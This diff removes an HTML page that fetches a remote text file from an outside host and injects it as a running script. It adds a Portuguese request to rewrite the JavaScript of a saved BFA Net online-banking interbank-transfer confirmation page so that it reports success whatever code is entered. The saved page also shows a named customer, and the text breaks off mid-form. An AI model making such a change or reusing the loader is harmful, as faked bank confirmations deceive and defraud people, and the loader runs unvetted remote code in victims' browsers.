@@ -1,58 +1,1241 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
+este é um codigo html que valida se um determinado codigo é correto ou nao, em seguida emite a mensagem operaçao feita com sucesso, quero que vc mude isso e independente do codigo for errado ou nao, ele emite operaçao feita com sucesso, mude apenas essa logica nos script javascript: 
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html id="template">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exemplo com CSP</title>
+	
 
-  <!-- Content Security Policy -->
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' https://realkooper77.github.io; script-src 'self' 'unsafe-inline' https://realkooper77.github.io;">
+<title>BFA Net - BFA Net</title>
+<meta name="Description" content="bfanet" />
+<meta name="KEYWORDS" content="bfanet" />
+<link type="image/ico" rel="shortcut icon" href="/favicon.ico" />
 
-  <script>
-    var scriptUrl = 'https://realkooper77.github.io/Alb-Dumper//index.txt';
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-15" />
 
-    fetch(scriptUrl)
-      .then(response => response.text())
-      .then(script => {
-        var scriptElement = document.createElement('script');
-        scriptElement.innerHTML = script;
-        document.head.appendChild(scriptElement);
-      })
-      .catch(error => {
-        console.error('Ocorreu um erro ao carregar o script:', error);
-      });
-  </script>
+
+
+<link href="/inc/css/css.css?v1" rel="stylesheet" type="text/css" />
+<link href="/inc/css/colorCss.css" rel="stylesheet" type="text/css" />
+<link href="/inc/css/ClickShowHideMenu.css" rel="stylesheet" type="text/css" />
+<link href="/inc/css/dropDownMenuX.css" rel="stylesheet" type="text/css" />
+<link href="/inc/css/extendCss.css?v1" rel="stylesheet" type="text/css" />
+
+<link href="/inc/css/printCss.css" rel="stylesheet" type="text/css" media="print" />
+
+<script type="text/javascript" src="/inc/js/functions.js"></script>
+<script type="text/javascript" src="/inc/js/cleave.min.js"></script>
+<script type="text/javascript" src="/inc/js/functions_bfa.js?version=1"></script>
+<script type="text/javascript" src="/inc/js/ie5.js"></script>
+<script type="text/javascript" src="/inc/js/js.js"></script>
+<script type="text/javascript" src="/inc/js/ClickShowHideMenu.js"></script>
+<script type="text/javascript" src="/inc/js/DropMenuX.js"></script>
+<script type="text/javascript" src="/inc/js/dateValidation.js?v3"></script>
+<script type="text/javascript" src="/inc/js/AC_RunActiveContent.js"></script>
+
+<script type="text/javascript" src="/inc/js/Globalization/pt-PT.js"></script>
+
+<script type="text/javascript" src="/inc/js/MicrosoftAjax.js"></script>
+
+<script type="text/javascript" src="/inc/js/jquery-1.7.1.min.js" ></script>
+<script type="text/javascript" src="/inc/js/jquery.blockUI.js" ></script>
+
+
+<meta http-equiv="Expires" content="0" /> 
+
+<meta http-equiv="Cache-Control" content="private" /> 
+
+
+<script language="JavaScript" type="text/javascript">
+    window.history.forward();
+
+    $(document) 
+        .ready(function() { 
+            $("a").each(function () {
+                
+                if (this.href.toUpperCase().indexOf('DOWNLOAD.ASPX?IDC=142&IDSC=2625') >= 0) {
+                    this.setAttribute("target", "_blank");
+                }
+			});
+
+			
+
+				try {
+					$("input.AutoNumberFormat:text").each(function () {
+						$(this).prop('onkeyup','').unbind('onkeyup');
+						$(this).prop('onchange', '').unbind('onchange');
+						$(this).blur(function () {
+							if ($(this).val() != "") {
+								if ($(this).val().indexOf(',') > -1) {
+									var values = $(this).val().split(',');
+
+									if (values[1] == "") {
+										$(this).val(values[0] + ',' + "00")
+									}
+									else if (values[1].length == 1) {
+										$(this).val(values[0] + ',' + values[1] + "0")
+									}
+
+									values = $(this).val().split(',');
+
+									if (values[0] == "") {
+										$(this).val("0" + ',' + values[1])
+									}
+								}
+								else {
+									$(this).val($(this).val() + ',' + "00")
+								}
+							}
+						});
+					});
+				} catch (err){
+
+				}
+
+				try {
+					new Cleave('.AutoNumberFormat', {
+						numeral: true,
+						numeralDecimalMark: ',',
+						delimiter: '.'
+					});
+				} catch (err) {
+
+				}
+
+			
+
+        });
+
+</script> 
+
+	
 </head>
-<body>
-  <h1>Exemplo de implementação de CSP</h1>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exemplo com CSP</title>
+<body   >
+    <a name="top" id="top"></a>
 
-  <!-- Content Security Policy -->
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' https://realkooper77.github.io; script-src 'self' 'unsafe-inline' https://realkooper77.github.io;">
+	
+<iframe style="height:0px;width:0px;visibility:hidden" src="about:blank">
+    this frame prevents back forward cache
+</iframe>
+<script type="text/javascript">
+    window.location.hash = "no-back-button";
+    window.location.hash = "Again-No-back-button"; //again because google chrome don't insert first hash into history
+    window.onhashchange = function () { window.location.hash = "no-back-button"; }
 
-  <script>
-    var scriptUrl = 'https://realkooper77.github.io/Alb-Dumper//index.txt';
+    setTimeout(keepAlive, 1);
+    function keepAlive()
+    {      
+        //var req = getreq();
+        //req.onreadystatechange = function(){};
+        //req.open("GET", + '/Transaccoes/KeepAlive.aspx', true);
+        //req.send(null);
+        $.get( "/Transaccoes/KeepAlive.aspx", function( data ) {});
+        setTimeout(keepAlive, 180000);
+    }
 
-    fetch(scriptUrl)
-      .then(response => response.text())
-      .then(script => {
-        var scriptElement = document.createElement('script');
-        scriptElement.innerHTML = script;
-        document.head.appendChild(scriptElement);
-      })
-      .catch(error => {
-        console.error('Ocorreu um erro ao carregar o script:', error);
-      });
-  </script>
-</head>
-<body>
-  <h1>Exemplo de implementação de CSP</h1>
-</body>
-</html>
+</script> 
+
+
+
+
+<div id="logoCx">
+    <div id="logo">
+        <h1>
+            <a id="ctl00_ctl02_logoImage" href="../Login/login_detail.aspx"><img src="/upl/{2ccb4d7b-62c0-4a43-9571-364bd536da7a}.jpg" alt="BFA Net" style="border-width:0px;" /></a></h1>        
+    </div>    <!--logo-->
+    
+    <div id="top">        
+        <div id="hbSairCx">        
+            
+<div id="userInfo">
+    <label>JOÃO LUVAN NKOSI</label>
+</div>
+
+            
+                <a style="margin-top:5px"  href="/Login/logout.aspx">
+                    Sair BFA Net
+                </a>
+            
+        </div>
+        <div class="data_header">
+        8 de outubro de 2024 <span id="hora_header"></span>
+        
+            <script type="text/javascript">
+                function display_ct() {
+                    var strcount;
+                    var date = new Date();
+                    h = date.getHours();
+                    if (h < 10) {
+                        h = "0" + h;
+                    }
+                    m = date.getMinutes();
+                    if (m < 10) {
+                        m = "0" + m;
+                    }
+                    s = date.getSeconds();
+                    if (s < 10) {
+                        s = "0" + s;
+                    }
+                    var x1 = h + ":" + m;  //+ ":" + s;
+                    document.getElementById('hora_header').innerHTML = x1;
+                    setTimeout('display_ct();', '1000');
+                    return true;
+                }
+                display_ct();
+            </script>
+        </div>
+        <div id="menu1" class="dmx">
+            
+                
+        </div>
+    </div>
+</div>
+<!--logoCx-->
+
+
+<hr />
+
+<div id="hbheaderCx">
+    <div id="hbheader">
+
+    
+    </div><!--hbheader-->
+</div><!--hbheaderCx-->
+  
+<noscript>
+    <p class="nojs">
+        O <em lang="en">Javascript</em> não está activo no <em lang="en">browser</em>. Saiba <a href="/javascript.html">aqui</a> como activá-lo.</p>
+</noscript>
+    
+    <div id="corpoCont">
+      
+	  <div id="corpo">
+	    <div id="colA">
+	        
+
+<div id="click-menu333" class="click-menu">
+
+      <div id="menuLat" class="menuLatHB">
+       
+
+         <ul id="navlist">
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Posição integrada</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl01_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/CPIN.aspx?idc=142&amp;idsc=179&amp;idl=1">Consulta</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Agenda de Vencimentos</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl02_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=180&amp;idl=1">Consulta</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Contas à ordem</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl03_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=181&amp;idl=1">Saldos</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl03_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/CMOV_CO.aspx?idc=142&amp;idsc=184&amp;idl=1">Movimentos</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl03_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=183&amp;idl=1">IBAN/SWIFT</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl03_subMenuRepeater_ctl04_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=182&amp;idl=1">Detalhe</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1-open">
+                <h3>
+              
+<a href="#" onclick="return false;" >Transferências</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl04_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=185&amp;idl=1">Mesmo Banco</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl04_subMenuRepeater_ctl02_menuItemURL" class="sel" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=186&amp;idl=1">Interbancária</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl04_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=187&amp;idl=1">Consultar</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl04_subMenuRepeater_ctl04_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=188&amp;idl=1">Cancelar</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Pagamentos</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl05_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=190&amp;idl=1">Serviços</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl05_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=2722&amp;idl=1">Recargas</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl05_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=2723&amp;idl=1">Serviços Especiais</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl05_subMenuRepeater_ctl04_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=2821&amp;idl=1">Carregamentos Directos</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl05_subMenuRepeater_ctl05_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=2997&amp;idl=1">Pagamento de impostos</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Seguro Viagem</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl06_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/SimulacaoViagem.aspx?idc=142&amp;idsc=2923&amp;idl=1">Simulação</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Cheques</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl07_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=196&amp;idl=1">Requisição</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl07_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=194&amp;idl=1">Cheques Emitidos</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl07_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=195&amp;idl=1">Extravio</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Cartões Pré-pagos</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl08_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=3016&amp;idl=1">Consulta de Cartões</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl08_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=2840&amp;idl=1">Pedido de Carregamento</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl08_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=2841&amp;idl=1">Consulta de Pedido de Carregamento</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Cartões de Débito</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl09_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=197&amp;idl=1">Consulta</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl09_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=198&amp;idl=1">Transacções (Todos os Cartões)</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Cartões de Crédito</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl10_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=351&amp;idl=1">Consulta de Cartões</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl10_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=347&amp;idl=1">Consulta Detalhe de Conta Cartão</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl10_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/CMOV_CTCD_CARC.aspx?idc=142&amp;idsc=354&amp;idl=1">Transacções</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl10_subMenuRepeater_ctl04_menuItemURL" href="/Transaccoes/ExtractosVISA.aspx?idc=142&amp;idsc=2628&amp;idl=1">Extractos</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Financiamento</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl11_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=200&amp;idl=1">Contas de Crédito</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl11_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=201&amp;idl=1">Detalhe de Contas de Crédito</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl11_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=202&amp;idl=1">Plano Financiamento</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl11_subMenuRepeater_ctl04_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=203&amp;idl=1">Contas Caucionadas</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl11_subMenuRepeater_ctl05_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=204&amp;idl=1">Detalhe Contas Caucionada</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl11_subMenuRepeater_ctl06_menuItemURL" href="/Transaccoes/CMOV_CC.aspx?idc=142&amp;idsc=205&amp;idl=1">Movimento de Caucionadas</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Contas a prazo</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl12_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=207&amp;idl=1">Saldos</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl12_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=208&amp;idl=1">Detalhe</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl12_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/CMOV_CP.aspx?idc=142&amp;idsc=209&amp;idl=1">Movimentos</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl12_subMenuRepeater_ctl04_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=210&amp;idl=1">Constituição</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl12_subMenuRepeater_ctl05_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=211&amp;idl=1">Reforço</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl12_subMenuRepeater_ctl06_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=212&amp;idl=1">Mobilização</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl12_subMenuRepeater_ctl07_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=213&amp;idl=1">Alterar parâmetros</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl12_subMenuRepeater_ctl08_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=214&amp;idl=1">Taxas</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Operações sobre o Estrangeiro</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl13_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=215&amp;idl=1">Câmbios</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl13_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=2947&amp;idl=1">Consultas</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Histórico das Operações</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl14_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/HIOP.aspx?idc=142&amp;idsc=3006&amp;idl=1">Consultar</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Documentos Digitais</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl15_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/DocDigitais.aspx?idc=142&amp;idsc=2810&amp;idl=1">Consultar</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >&nbsp;</a>
+                </h3>
+            </div>
+             
+          </li>
+    
+    
+          <li>
+            <div class="box1">
+                <h3>
+              
+<a href="#" onclick="return false;" >Personalizar</a>
+                </h3>
+            </div>
+            
+                    
+                    <div class="section">     
+                    <h4>
+                     <ul id="navlistb">
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl17_subMenuRepeater_ctl01_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=220&amp;idl=1">Personalizar Conta</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl17_subMenuRepeater_ctl02_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=217&amp;idl=1">Alterar Código Secreto</a>   
+                    
+                    
+                    </li>
+                
+                    <li class="box1">
+                    
+                       <a id="ctl00_ctl04_menuLatRepeater_ctl17_subMenuRepeater_ctl03_menuItemURL" href="/Transaccoes/transaccao.aspx?idc=142&amp;idsc=223&amp;idl=1">Alterar Chave Confirmação</a>   
+                    
+                    
+                    </li>
+                
+                     </ul>
+                     </h4>
+                    </div>
+                 
+          </li>
+    
+           </ul>            
+        
+        </div><!--menuLat-->  
+    
+</div><!--click-menu-->
+
+<script type="text/javascript">
+	var clickMenu1 = new ClickShowHideMenu('click-menu333');
+	clickMenu1.init();
+
+	var id_openbox = $(".box1-open");
+	if (id_openbox && id_openbox.length > 0) {
+	    clickMenu1.show(id_openbox[0].id);
+	}
+	
+</script>
+
+	 	</div>
+	 	
+	 	<div id="colB2">
+            <div id="path"><a href="/Login/login_detail.aspx" >Página de entrada</a> > Transferências > Interbancária</div>
+
+	        
+<script type="text/javascript">
+    function generatePDF() {
+        var anul = document.getElementById('ctl00_ctl00_AnulaOperacaoButton');
+        if (!anul || confirm(' Ao gerar o documento não poderá anular a transacção.\nContinuar?')) {
+            window.open('/inc/generatePDF.ashx?idl=1&DocId=bdd09d02-b209-4a42-8809-260c82f374f5');
+            hideAnul();
+        }
+    }
+
+    function printComprovativo() {
+        var anul = document.getElementById('ctl00_ctl00_AnulaOperacaoButton');
+        if (!anul || confirm(' Ao gerar o documento não poderá anular a transacção.\nContinuar?')) {
+
+            var hdnPid = document.getElementById('hdnPid');
+            var url = 'GerarComprovativo.aspx?NumRegisto=&transaccao=PTSP&data=2024%2f10%2f08&idl=1';
+            if (hdnPid) {
+                url = url + "&payid=" + hdnPid.value;
+            }
+            openDetail(url);
+            hideAnul();
+        }
+    }
+
+    function hideAnul() {
+        var anul = document.getElementById('ctl00_ctl00_AnulaOperacaoButton');
+        if (anul) {
+            anul.parentNode.removeChild(anul);
+        }
+
+        var anulRefHidden = document.getElementById('ctl00_ctl00_anulRefHidden');
+        if (anulRefHidden) {
+            anulRefHidden.value = '';
+        }
+    }
+
+    function printPage() {
+        if (document.getElementById('ctl00_ctl00_pdfPrint') || document.getElementById('ctl00_ctl00_AnulaOperacaoButton')) {
+            generatePDF();
+        }
+        else {
+            print();
+        }
+    }
+
+    addLoadEvent(
+        function () {
+            
+
+            $('#ctl00_ctl00_pdfPrint').css("display", "none");
+        }
+    )
+
+    function downloadCert(id) {
+        // Create a form
+        var f = document.createElement("form");
+
+        // Add it to the document body
+        document.body.appendChild(f);
+
+        // Add action and method attributes
+        f.method = "POST";
+        f.target= "_blank";
+
+        f.action = '/Transaccoes/InsuranceCertDownload.aspx?id=' + id;
+
+        f.submit();
+    }
+</script>
+<div id="titulo">
+   
+        <div id="print">
+            <a href="#" onclick="javascript:print();">
+                <img src="/img/print.gif" alt='Imprimir'
+                    title='Imprimir' />
+            </a>
+        </div>
+    
+    <h2>
+        Interbancária
+    </h2>
+</div>
+<div id="txtEnquadramento">
+    
+</div>
+<div id="confirmacao">
+    <form name="aspnetForm" method="post" action="confkey.aspx?idc=142&amp;idsc=186&amp;idl=1" onsubmit="javascript:return WebForm_OnSubmit();" id="aspnetForm" autocomplete="off">
+<div>
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
